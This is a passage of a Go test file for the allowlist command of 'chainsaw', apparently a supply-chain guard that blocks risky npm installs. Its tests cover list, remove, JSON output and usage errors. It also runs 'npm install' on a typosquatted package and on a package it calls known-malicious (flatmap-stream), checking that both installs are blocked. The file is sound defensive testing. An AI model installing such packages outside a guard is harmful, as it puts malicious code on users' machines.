	if err := cmd.Flags().Set("list", "true"); err != nil {
		t.Fatal(err)
	}
	if err := runGuardAllow(cmd, nil); err != nil {
		t.Fatalf("guard allow --list: %v", err)
	}
	for _, want := range []string{"npm:lodahs", "typosquat", path} {
		if !strings.Contains(out.String(), want) {
			t.Errorf("--list output missing %q:\n%s", want, out.String())
		}
	}

	// remove
	cmd, out = newGuardAllowTestCmd(t)
	if err := cmd.Flags().Set("remove", "true"); err != nil {
		t.Fatal(err)
	}
	if err := runGuardAllow(cmd, []string{"npm:lodahs"}); err != nil {
		t.Fatalf("guard allow --remove: %v", err)
	}
	if !strings.Contains(out.String(), "Removed npm:lodahs") {
		t.Errorf("remove output:\n%s", out.String())
	}
	if got := len(loadGuardAllowlist().File.Entries); got != 0 {
		t.Fatalf("after --remove the store still holds %d rows", got)
	}
	// The block is back — removal actually restores enforcement.
	if v := newLocalGuard().evaluate(ctx, spec); !v.Block {
		t.Fatalf("after --remove the package no longer blocks: %+v", v)
	}

	// removing something absent is a satisfied request, not an error
	cmd, out = newGuardAllowTestCmd(t)
	if err := cmd.Flags().Set("remove", "true"); err != nil {
		t.Fatal(err)
	}
	if err := runGuardAllow(cmd, []string{"npm:lodahs"}); err != nil {
		t.Fatalf("idempotent remove returned an error: %v", err)
	}
	if !strings.Contains(out.String(), "not in the allowlist") {
		t.Errorf("idempotent remove said nothing about the coordinate being absent:\n%s", out.String())
	}
}

// TestGuardAllowEmptyListIsHelpful — the first thing a curious user runs.
func TestGuardAllowEmptyListIsHelpful(t *testing.T) {
	withGuardAllowlistStore(t)
	cmd, out := newGuardAllowTestCmd(t)
	if err := cmd.Flags().Set("list", "true"); err != nil {
		t.Fatal(err)
	}
	if err := runGuardAllow(cmd, nil); err != nil {
		t.Fatalf("guard allow --list on an empty store: %v", err)
	}
	if !strings.Contains(out.String(), "No packages are allowed") {
		t.Errorf("empty --list output:\n%s", out.String())
	}
}

// TestGuardAllowListReportsAnUnusableStore — the install path has already
// stood down to an empty allowlist by this point, so the user's cleared false
// block is quietly blocking again. This is where they find out why.
func TestGuardAllowListReportsAnUnusableStore(t *testing.T) {
	path := withGuardAllowlistStore(t)
	mustWrite(t, path, "{{{ not json")
	invalidateGuardAllowlistCache()

	cmd, out := newGuardAllowTestCmd(t)
	if err := cmd.Flags().Set("list", "true"); err != nil {
		t.Fatal(err)
	}
	if err := runGuardAllow(cmd, nil); err != nil {
		t.Fatalf("guard allow --list: %v", err)
	}
	if !strings.Contains(out.String(), "WARNING") {
		t.Errorf("--list stayed silent about an unusable store:\n%s", out.String())
	}
}

func TestGuardAllowUsageErrors(t *testing.T) {
	cases := []struct {
		name  string
		flags map[string]string
		args  []string
	}{
		{"no arguments", nil, nil},
		{"list with an argument", map[string]string{"list": "true"}, []string{"npm:nano"}},
		{"list and remove together", map[string]string{"list": "true", "remove": "true"}, nil},
		{"remove with no coordinate", map[string]string{"remove": "true"}, nil},
		{"malformed coordinate", nil, []string{"nano"}},
		{"unknown ecosystem", nil, []string{"maven:com.foo"}},
	}
	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			withGuardAllowlistStore(t)
			cmd, _ := newGuardAllowTestCmd(t)
			for k, v := range tc.flags {
				if err := cmd.Flags().Set(k, v); err != nil {
					t.Fatal(err)
				}
			}
			err := runGuardAllow(cmd, tc.args)
			if code := exitCodeOf(t, err); code != ExitUsage {
				t.Fatalf("exit = %d, want ExitUsage(%d) (err=%v)", code, ExitUsage, err)
			}
		})
	}
}

// TestGuardAllowJSONNeverWeakensTheRefusal is the emitAndGate property applied
// here: choosing a machine-readable format is a rendering decision and must
// never turn a refusal into a success. Four commands in this CLI grew that bug
// independently, which is why it is asserted rather than assumed.
func TestGuardAllowJSONNeverWeakensTheRefusal(t *testing.T) {
	path := withGuardAllowlistStore(t)
	cmd, _ := newGuardAllowTestCmd(t)
	if err := cmd.Flags().Set("json", "true"); err != nil {
		t.Fatal(err)
	}

	var payload map[string]any
	stdout := captureStdout(t, func() {
		err := runGuardAllow(cmd, []string{"npm:flatmap-stream"})
		if code := exitCodeOf(t, err); code != ExitBlocked {
			t.Errorf("--json refusal exit = %d, want ExitBlocked(%d)", code, ExitBlocked)
		}
	})
	if err := json.Unmarshal([]byte(stdout), &payload); err != nil {
		t.Fatalf("--json did not emit a JSON object (%v):\n%s", err, stdout)
	}
	if payload["action"] != "refused" || payload["allowlisted"] != false {
		t.Errorf("refusal payload = %v", payload)
	}
	if _, statErr := os.Stat(path); !os.IsNotExist(statErr) {
		t.Error("the --json refusal still wrote the store")
	}
}

func TestGuardAllowJSONAddPayload(t *testing.T) {
	withGuardAllowlistStore(t)
	cmd, _ := newGuardAllowTestCmd(t)
	if err := cmd.Flags().Set("json", "true"); err != nil {
		t.Fatal(err)
	}
	var payload map[string]any
	stdout := captureStdout(t, func() {
		if err := runGuardAllow(cmd, []string{"npm:lodahs"}); err != nil {
			t.Errorf("guard allow --json: %v", err)
		}
	})
	if err := json.Unmarshal([]byte(stdout), &payload); err != nil {
		t.Fatalf("not JSON (%v):\n%s", err, stdout)
	}
	for _, key := range []string{"action", "ecosystem", "name", "reason", "allowed_at", "path"} {
		if _, ok := payload[key]; !ok {
			t.Errorf("JSON payload missing %q: %v", key, payload)
		}
	}
}

// ── the block-output escape-hatch hint ──────────────────────────────────────

// TestGuardBlockOutputNamesTheEscapeHatch runs the REAL binary, because the
// block printer sits behind an os.Exit and is not reachable in-process.
//
// Two assertions, and the second is the one with teeth: the hint appears for a
// typosquat refusal, and does NOT appear next to a known-malicious refusal —
// where it would advertise a bypass that does not exist.
func TestGuardBlockOutputNamesTheEscapeHatch(t *testing.T) {
	if testing.Short() {
		t.Skip("builds the CLI binary")
	}
	bin := buildChainsawForAllowTest(t)

	run := func(t *testing.T, pkg string) string {
		t.Helper()
		cmd := exec.Command(bin, "npm", "install", pkg)
		cmd.Env = append(os.Environ(),
			"NO_COLOR=1",
			"CHAINSAW_OFFLINE=1",
			"CHAINSAW_NO_TELEMETRY=1",
			"CHAINSAW_TELEMETRY_DISABLED=1",
			"CHAINSAW_CONFIG_HOME="+t.TempDir(),
			"CHAINSAW_GUARD_ALLOWLIST="+filepath.Join(t.TempDir(), "allow.json"),
			"CHAINSAW_GUARD_DB="+filepath.Join(t.TempDir(), "absent.json"),
		)
		var stderr strings.Builder
		cmd.Stderr = &stderr
		cmd.Stdout = &strings.Builder{}
		_ = cmd.Run() // a block exits 1; the exit code is pinned elsewhere
		body := stderr.String()
		if !strings.Contains(body, "blocked") {
			t.Fatalf("`npm install %s` did not block; the fixture is stale:\n%s", pkg, body)
		}
		return body
	}

	t.Run("typosquat block names it", func(t *testing.T) {
		body := run(t, "lodahs")
		if !strings.Contains(body, "chainsaw guard allow npm:lodahs") {
			t.Fatalf("a typosquat block did not name the escape hatch; the user's only "+
				"remaining option is to uninstall the guard:\n%s", body)
		}
	})

	t.Run("known-malicious block does not", func(t *testing.T) {
		body := run(t, "flatmap-stream")
		if strings.Contains(body, "guard allow") {
			t.Fatalf("a known-malicious block advertised `guard allow`, which cannot clear it:\n%s", body)
		}
	})
}

// buildChainsawForAllowTest compiles cmd/chainsaw into a temp path. Named
// distinctly from the identical helper in guard_quiet_invariant_test.go, which
// lives in the EXTERNAL cli_test package and is therefore not reachable here.
func buildChainsawForAllowTest(t *testing.T) string {
	t.Helper()
	goTool, err := exec.LookPath("go")
	if err != nil {
		t.Skip("go toolchain not on PATH")
	}
	bin := filepath.Join(t.TempDir(), "chainsaw")
	if runtime.GOOS == "windows" {
		bin += ".exe"
	}
	out, err := exec.Command(goTool, "build", "-o", bin, "../cmd/chainsaw").CombinedOutput()
	if err != nil {
		t.Fatalf("build chainsaw: %v\n%s", err, out)
	}
	return bin
}
